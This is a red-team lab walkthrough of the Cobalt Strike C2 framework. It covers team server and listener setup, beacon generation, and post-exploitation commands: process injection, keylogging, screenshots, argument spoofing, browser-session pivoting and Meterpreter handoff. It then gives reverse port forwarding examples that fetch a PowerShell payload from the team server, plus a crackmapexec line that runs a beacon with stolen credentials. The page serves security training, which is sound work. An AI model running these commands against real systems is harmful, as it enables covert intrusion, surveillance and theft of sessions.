# Cobalt Strike 101

This lab is for exploring the advanced penetration testing / post-exploitation tool Cobalt Strike.

## Definitions

* Listener - a service running on the attacker's C2 server that is listening for beacon callbacks
* Beacon - a malicious agent / implant on a compromised system that calls back to the attacker controlled system and checks for any new commands that should be executed on the compromised system
* Team server - Cobalt Strike's server component. Team server is where listeners for beacons are configured and stood up.

## Getting Started

### Team Server

{% code title="attacker@kali" %}
```csharp
# the syntax is ./teamserver <serverIP> <password> <~killdate> <~profile>
# ~ optional for now
root@/opt/cobaltstrike# ./teamserver 10.0.0.5 password
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-06-22-47-10.png)

{% hint style="info" %}
Note that in real life red team engagements, you would put the team servers behind redirectors to add resilience to your attacking infrastructure. See [Red Team Infrastructure](./)
{% endhint %}

### Cobalt Strike Client

{% code title="attacker@kali" %}
```csharp
root@/opt/cobaltstrike# ./cobaltstrike
```
{% endcode %}

Enter the following:

* host - team server IP or DNS name
* user - anything you like - it's just a nickname
* password - your team server password

![](../../.gitbook/assets/screenshot-from-2019-01-06-22-51-40.png)

### Demo

All of the above steps are shown below in one animated gif:

![](../../.gitbook/assets/peek-2019-01-06-22-56.gif)

## Setting Up Listener

Give your listener a descriptive name and a port number the team server should bind to and listen on:

![](<../../.gitbook/assets/Peek 2019-01-07 18-01 (1).gif>)

## Generating a Stageless Payload

Generate a stageless (self-contained exe) beacon - choose the listener your payload will connect back to and payload architecture and you are done:

![](../../.gitbook/assets/peek-2019-01-07-18-03.gif)

## Receiving First Call Back

On the left is a victim machine, executing the previously generated beacon - and on the left is a cobalt strike client connected to the teamserver catching the beacon callback:

![](../../.gitbook/assets/peek-2019-01-07-18-15.gif)

## Interacting with Beacon

Right click the beacon and select interact. Note the new tab opening at the bottom of the page that allows an attacker issuing commdands to the beacon:

![](../../.gitbook/assets/screenshot-from-2019-01-07-18-22-38.png)

## Interesting Commands & Features

### Argue

Argue command allows the attacker to spoof commandline arguments of the process being launched.

The below spoofs calc command line parameters:

{% code title="attacker@cs" %}
```csharp
beacon> argue calc /spoofed
beacon> run calc
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-07-19-18-23.png)

Note the differences in commandline parameters captured in sysmon vs procexp:

![](../../.gitbook/assets/screenshot-from-2019-01-07-19-09-47.png)

Argument spoofing is done via manipulating memory structures in Process Environment Block which I have some notes about:

{% content-ref url="../defense-evasion/masquerading-processes-in-userland-through-_peb.md" %}
[masquerading-processes-in-userland-through-\_peb.md](../defense-evasion/masquerading-processes-in-userland-through-\_peb.md)
{% endcontent-ref %}

{% content-ref url="../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md" %}
[exploring-process-environment-block.md](../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md)
{% endcontent-ref %}

### Inject

Inject is very similar to metasploit's `migrate` function and allows an attacker to duplicate their beacon into another process on the victim system:

{% code title="attacker@cs" %}
```csharp
beacon> help inject
Use: inject [pid] <x86|x64> [listener]

inject 776 x64 httplistener
```
{% endcode %}

Note how after injecting the beacon to PID 776, another session is spawned:

![](../../.gitbook/assets/peek-2019-01-07-20-16.gif)

### Keylogger

{% code title="attacker@cs" %}
```csharp
beacon> keylogger 1736 x64
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-31-30.png)

### Screenshot

{% code title="attacker@cs" %}
```csharp
beacon> screenshot 1736 x64
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-33-51.png)

### Runu

Runu allows us launching a new process from a specified parent process:

{% code title="attacker@cs" %}
```csharp
runu 2316 calc
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-39-20.png)

### Psinject

This function allows an attacker executing powershell scripts from under any process on the victim system. Note that PID 2872 is the calc.exe process seen in the above screenshot related to `runu`:

{% code title="attacker@cs" %}
```csharp
beacon> psinject 2872 x64 get-childitem c:\
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-44-30.png)

Highlighted in green are new handles that are opened in the target process when powershell script is being injected:

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-52-16.png)

### Spawnu

Spawn a session with powershell payload from a given parent PID:

{% code title="attacker@cs" %}
```csharp
beacon> spawnu 3848 httplistener
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-57-30.png)

![](../../.gitbook/assets/screenshot-from-2019-01-07-20-57-25.png)

### Browser Pivoting

This feature enables an attacker riding on compromised user's browsing sessions.

The way this attack works is best explained with an example:

* Victim log's in to some web application using Internet Explorer.
* Attacker/operator creates a browser pivot by issuing a `browserpivot` command
* The beacon creates a proxy server on the victim system (in Internet Explorer process to be more precise) by binding and listening to a port, say 6605
* Team server binds and starts listening to a port, say 33912
* Attacker can now use their teamserver:33912 as a web proxy. All the traffic that goes through this proxy will be forwarded/traverse the proxy opened on the victim system via the Internet Explorer process (port 6605). Since Internet Explorer relies on WinINet library for managing web requests and authentication, attacker's web requests will be reauthenticated allowing the attacker to view same applications the victim has active sessions to without being asked to login.

Browser pivotting in cobalt strike:

{% code title="attacker@cs" %}
```csharp
beacon> browserpivot 244 x86
```
{% endcode %}

Note how the iexplore.exe opened up port 6605 for listening as mentioned earlier:

![](../../.gitbook/assets/screenshot-from-2019-01-07-21-23-50.png)

The below illustrates the attack visually. On the left - a victim system logged to some application and on the right - attacker id trying to access the same application and gets presented with a login screen since they are not authenticated:

![](../../.gitbook/assets/screenshot-from-2019-01-07-21-33-54.png)

The story changes if the attacker starts proxying his web traffic through the victim proxy `10.0.0.5:33912`:

![](../../.gitbook/assets/peek-2019-01-07-21-36.gif)

### System Profiler

A nice feature that profiles potential victims by gathering information on what software / plugins victim system has installed:

![](../../.gitbook/assets/screenshot-from-2019-01-07-21-52-32.png)

Once the the profilder URL is visited, findings are presented in the Application view:

![](../../.gitbook/assets/screenshot-from-2019-01-07-21-52-58.png)

Event logs will show how many times the profiler has been used by victims:

![](../../.gitbook/assets/screenshot-from-2019-01-07-21-52-50.png)

## c2Concealer

C2concealer is a command line tool that generates randomized C2 malleable profiles for use in Cobalt Strike.

{% embed url="https://github.com/FortyNorthSecurity/C2concealer" %}

## Spawn meterpreter

&#x20;

![](<../../.gitbook/assets/image (4).png>)

#### Spawn Meterpreter from Beacon

Cobalt Strike’s session passing features target listeners. A [listener](https://www.cobaltstrike.com/help-listener-management) is a name tied to a payload handler and its configuration information. A foreign listener is an alias for a payload handler located elsewhere. Cobalt Strike can pass sessions to the Metasploit Framework with foreign listeners. To create a foreign listener for Meterpreter:

1\. Go to **Cobalt Strike** -> **Listeners**

2\. Press **Add**

3\. Set the Payload type to windows/foreign/reverse\_https for HTTPS Meterpreter. Cobalt Strike also has reverse\_http and reverse\_tcp foreign listeners too.

4\. Set The Host and Port of the listener to the LHOST and LPORT of your Meterpreter handler.

5\. Press **Save**

You now have a Cobalt Strike listener that refers to your Metasploit Framework payload handler. You can use this listener with any of Cobalt Strike’s features. To pass a session from Beacon, go to **\[beacon]** -> **Spawn** and choose your foreign listener.

#### Spawn Beacon from Meterpreter

To spawn a Beacon from a Meterpreter session use the payload\_inject exploit to deliver your Beacon. Here are the steps to do this:

1\. Use the exploit/windows/local/payload\_inject module

2\. Set **PAYLOAD** to windows/meterpreter/reverse\_http for an HTTP Beacon. Set PAYLOAD to windows/meterpreter/reverse\_https for an HTTPS Beacon.

3\. Set **LHOST** and **LPORT** to point to your Cobalt Strike listener.

4\. Set **DisablePayloadHandler** to True.

5\. Set **SESSION** to the session ID of your Meterpreter session

And, here’s what this looks like in the Metasploit Framework console:

| <p><code>use exploit/windows/local/payload_injectset</code> </p><p><code>PAYLOAD windows/meterpreter/reverse_httpset</code> </p><p><code>LHOST [IP address of compromised system]</code></p><p><code>set LPORT 80set SESSION 1</code></p><p><code>set DisablePayloadHandler True</code></p><p><code>exploit –j</code></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

### Peer-to-Peer Listeners

Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are **TCP** and **SMB**.

Linking Beacons is especially useful when it comes to pivoting, privilege escalation and any other situation where you need to spawn an additional Beacon payload. They help keep the number of direct outbound connections to your attacking infrastructure low and for machines and/or principals that can't send HTTP/S outbound at all.

Creating P2P listeners can be done in the **Listeners** menu, by selecting the **TCP** or **SMB** Beacon payload type. These listeners integrate into all the relevant Cobalt Strike workflows such as `spawn`, `spawnas`, `inject` and `jump`; and payloads for these listeners can also be generated in the same way from the **Attacks** menu.

If executing a P2P payload on a target manually, it won't appear in the UI until the `link` (for SMB Beacons) or `connect` (for TCP Beacons) command is used. You can also `unlink` P2P Beacons and then use `link` again from another Beacon to reorganise the chain.



### Reverse Port Foward

Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.  A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.  Take this very simple example:

Computers A and B can talk to each other, as can B and C; but A and C cannot talk directly.  A reverse port forward on Computer B can act as a "relay" between Computers C and A.

![](https://rto-assets.s3.eu-west-2.amazonaws.com/reverse-port-forward/simple-example.png)

There are two main ways to create a reverse port forward:

1. Windows `netsh`.
2. Reverse port forward capability built into the C2 framework.

#### Windows Firewall

Let's start with the Windows Firewall.

In the lab, there are four domains:  dev.cyberbotic.io, cyberbotic.io, zeropointsecurity.local and subsidiary.external.  Not all of these domains can talk to each other directly - the traffic flow looks a little like this:

![](https://rto-assets.s3.eu-west-2.amazonaws.com/reverse-port-forward/domain-traffic-flow.png)

For instance - cyberbotic.io can talk with dev.cyberbotic.io, but not to subsidiary.external.  So let's use this as an opportunity to create a reverse port forward that will allow _dc-1.cyberbotic.io_ to talk to ad\_.subsidiary.external\_ via _dc-2.dev.cyberbotic.io_.

&#x20; It's not necessary to specifically use domain controllers, it's just a convenience factor here.

First, run the following PowerShell script on the target, _ad.subsidiary.external_:

```
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
  $client = $listener.AcceptTcpClient()
  Write-Host "A client has connected"
  $client.Close()
}
```

This will bind port 4444, listen for incoming connections and print a message when something does.  This is how we're going to prove the reverse port forward works.

Try to connect to this port from _dc-1.cyberbotic.io_ and it should fail.

```
PS C:\> hostname
dc-1

PS C:\> Test-NetConnection -ComputerName 10.10.14.55 -Port 4444
WARNING: TCP connect to 10.10.14.55:4444 failed
WARNING: Ping to 10.10.14.55 failed -- Status: TimedOut
```

The native `netsh` (short for Network Shell) utility allows you to view and configure various networking components on a machine, including the firewall.  There's a subset of commands called `interface portproxy` which can proxy both IPv4 and IPv6 traffic between networks.

The syntax to add a **v4tov4** proxy is:

```
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```

Where:

* **listenaddress** is the IP address to listen on (probably always 0.0.0.0).
* **listenport** is the port to listen on.
* **connectaddress** is the destination IP address.
* **connectport** is the destination port.
* **protocol** to use (always TCP).

On _dc-2.dev.cyberbotic.io_ (the relay), create a portproxy that will listen on 4444 and forward the traffic to _ad.subsidiary.external_, also on 4444.

```
C:\>hostname
dc-2

C:\>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

&#x20; You won't see any output from the command, but you can check it's there with `netsh interface portproxy show`.

```
C:\>netsh interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         4444        10.10.14.55    4444
```

Now, from _dc-1.cyberbotic.io_, instead of trying to connect directly to _ad.subsidiary.external_, connect to this portproxy on _dc-2.dev.cyberbotic.io_ and you will see the connection being made in the PowerShell script.

```
PS C:\> hostname
dc-1

PS C:\> Test-NetConnection -ComputerName 10.10.17.71 -Port 4444

ComputerName     : 10.10.17.71
RemoteAddress    : 10.10.17.71
RemotePort       : 4444
InterfaceAlias   : Ethernet
SourceAddress    : 10.10.15.75
TcpTestSucceeded : True
```

```
PS C:\Users\Administrator\Desktop> hostname
ad

PS C:\Users\Administrator\Desktop> .\listener.ps1
Listening on port 4444
A client has connected
```

To remove the portproxy:

```
C:\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

Aspects to note about netsh port forwards:

* You need to be a local administrator to add and remove them, regardless of the bind port.
* They're socket-to-socket connections, so they can't be made through network devices such as firewalls and web proxies.
* They're particularly good for creating relays between machines.

#### rportfwd Command

Next, let's look at Beacon's `rportfwd` command.

In the lab and many corporate environments, workstations are able to browse the Internet on ports 80 and 443, but servers have no direct outbound access (because why do they need it?).

Let's imagine that we already have foothold access to a workstation and have a means of moving laterally to a server - we need to deliver a payload to it but it doesn't have Internet access to pull it from our Team Server. We can use the workstation foothold as a relay point between our webserver and the target.

If you don't already have a payload hosted via the Scripted Web Delivery, do so now. Then from _dc-2.dev.cyberbotic.io_, attempt to download it.

```
PS C:\> hostname
dc-2

PS C:\> iwr -Uri http://10.10.5.120/a
iwr : Unable to connect to the remote server
```

The syntax for the `rportfwd` command is `rportfwd [bind port] [forward host] [forward port]`. On WKSTN-1:

```
beacon> rportfwd 8080 10.10.5.120 80
[+] started reverse port forward on 8080 to 10.10.5.120:80
```

This will bind port **8080** on the foothold machine, which we can see with **netstat**.

```
beacon> run netstat -anp tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```

Now any traffic hitting this port will be redirected to **10.10.5.120** on port **80**. On DC-2, instead of trying to hit **10.10.5.120:80**, we use **10.10.17.231:8080** (where 10.10.17.231 is the IP address of WKSTN-1).

```
PS C:\> iwr -Uri http://10.10.17.231:8080/a

StatusCode        : 200
StatusDescription : OK
Content           : $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAOy9Wa/qSrIu+rzrV8yHLa21xNo
                    1wIAxR9rSNTYY444eTJ1SyRjjBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9EZoRXTvEfqyLz7UKLT863/9g6We7H0T
                    fm...
```

The Web Log in Cobalt Strike also lets us know the request has reached us.

```
07/09 16:17:24 visit (port 80) from: 10.10.5.120
Request: GET /a
page Scripted Web Delivery (powershell)
Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.3866
```

This is a contrived demo, but we'll see practical examples of using this in modules such as **Group Policy** and **MS SQL Servers**.

To stop the reverse port forward, do `rportfwd stop 8080` from within the Beacon or click the **Stop** button in the **Proxy Pivots** view.

Aspects to note:

* Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.
* The traffic is tunnelled inside Beacon's C2 traffic, not over separate sockets, and also works over P2P links.
* You don't need to be a local admin to create reverse port forwards on high ports.

#### rportfwd\_local

Beacon also has a `rportfwd_local` command.  Whereas `rportfwd` will tunnel traffic to the Team Server, `rportfwd_local` will tunnel the traffic to the machine running the Cobalt Strike client.

This is particularly useful in scenarios where you want traffic to hit tools running on your local system, rather than the Team Server.

Take this Python http server as an example, whilst running the CS client on Kali:

```
root@kali:~# echo "This is a test" > test.txt
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/)
```

```
beacon> rportfwd_local 8080 127.0.0.1 8080
[+] started reverse port forward on 8080 to rasta -> 127.0.0.1:8080
```

This will bind port 8080 on the machine running the Beacon and will tunnel the traffic to port 8080 of the localhost running the Cobalt Strike client.  Notice how it uses your username as an indicator of where the traffic will go.

Then on another machine in the network, try to download the file.

```
PS C:\> hostname
wkstn-2

PS C:\> iwr -Uri http://wkstn-1:8080/test.txt

StatusCode : 200
StatusDescription : OK
Content : This is a test
```

Of course, we see the request on the Python server.

```
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ...
127.0.0.1 - - [23/Jul/2021 19:24:30] "GET /test.txt HTTP/1.1" 200 -
```

## Spawn as another user

```bash
proxychains -q cme smb <ip> -u <user> -p <password> -x "cd <path> && .\beacon177.exe"
```

## References

[https://www.cobaltstrike.com/downloads/csmanual313.pdf](https://www.cobaltstrike.com/downloads/csmanual313.pdf)
